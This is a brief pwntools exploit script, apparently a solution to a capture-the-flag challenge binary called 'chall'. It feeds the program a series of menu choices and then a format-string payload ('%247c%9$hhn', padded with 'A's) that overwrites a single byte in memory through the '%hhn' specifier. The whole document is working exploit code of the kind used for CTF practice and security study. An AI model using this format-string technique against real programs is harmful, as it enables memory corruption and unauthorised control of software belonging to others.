from pwn import *

p = process("./chall")

sleep(1)

fmt = b"%247c%9$hhn"
fmt += b"A" * (19 - len(fmt))
print(p.recv())
p.sendline(b"11")
print(p.recv())
p.sendline(b"0")
print(p.recv())
p.sendline(b"69")
print(p.recv())
p.sendline(fmt)
print(p.recv())
